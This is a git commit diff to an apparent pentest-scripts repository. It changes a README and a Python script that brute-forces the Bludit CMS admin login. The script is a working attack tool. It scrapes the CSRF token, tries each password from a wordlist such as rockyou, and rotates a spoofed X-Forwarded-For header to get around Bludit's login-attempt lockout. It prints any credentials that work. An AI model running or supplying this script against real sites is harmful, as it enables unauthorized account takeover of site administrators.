8bd46c672c579d51a4a6134ef01e6ed822032cb5
limao <alexandre.cyber@outlook.com>
2020-07-18 10:57:56 -0300

    update

--- README.md
+++ README.md
@@ -9,6 +9,14 @@ These scripts are to help in some phases of Pentest or to handle with some aplic
 This script try to brute force the Bludit aplication to get access to the login page. 
 It'll work until 3.9.0 version of Bludit. I found this script and modify for my own will. 
 
+To this script works you have to modify the following fields:
+
+host = '127.0.0.1'
+
+login_url = host + '/admin/login'
+
+username = 'admin'
+
 The source of the Bludit script is in the link below:
 
 https://rastating.github.io/bludit-brute-force-mitigation-bypass/
--- bludit_brute_force/bludit_brute_force.py
+++ bludit_brute_force/bludit_brute_force.py
@@ -1,38 +1,48 @@
 import re
 import requests
+import sys
 
-host = '127.0.0.1'
-login_url = host + '/admin/login'
-username = 'admin'
+if len(sys.argv) != 5:
+    print("Use mode: python3 bludit_brute_force.py 127.0.0.1 /admin/login admin wordlist.txt")
 
-# Getting wordlist
-with open("/usr/share/wordlists/rockyou.txt", "r") as f:
-    wordlist = f.readlines()
+else:
+    try:
+        host = sys.argv[1]
+        login_url = host + sys.argv[2]
+        username = sys.argv[3]
+        file = sys.argv[4]
 
-for password in wordlist:
-    session = requests.Session()
-    login_page = session.get(login_url)
-    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+        # Getting wordlist
+        with open(file, "r") as f:
+            wordlist = f.readlines()
 
-    print('[*] Trying: {p}'.format(p = password.strip("\n")))
+        for password in wordlist:
+            session = requests.Session()
+            login_page = session.get(login_url)
+            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
 
-    headers = {
-        'X-Forwarded-For': password.strip("\n"),
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
-        'Referer': login_url
-    }
+            print('[*] Trying: {p}'.format(p = password.strip("\n")))
 
-    data = {
-        'tokenCSRF': csrf_token,
-        'username': username,
-        'password': password.strip("\n"),
-        'save': ''
-    }
+            headers = {
+                'X-Forwarded-For': password.strip("\n"),
+                'User-Agent': """Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
+                Chrome/77.0.3865.90 Safari/537.36""",
+                'Referer': login_url
+            }
 
-    login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)
+            data = {
+                'tokenCSRF': csrf_token,
+                'username': username,
+                'password': password.strip("\n"),
+                'save': ''
+            }
 
-    if 'location' in login_result.headers:
-        if '/admin/dashboard' in login_result.headers['location']:
-            print('SUCCESS: Password found!')
-            print('Use {u}:{p} to login.'.format(u = username, p = password.strip("\n")))
-            break
+            login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)
+
+            if 'location' in login_result.headers:
+                if '/admin/dashboard' in login_result.headers['location']:
+                    print('SUCCESS: Password found!')
+                    print('Use {u}:{p} to login.'.format(u = username, p = password.strip("\n")))
+                    break
+    except IndexError:
+        print("Use mode: python3 bludit_brute_force.py 127.0.0.1 /admin/login admin wordlist.txt")
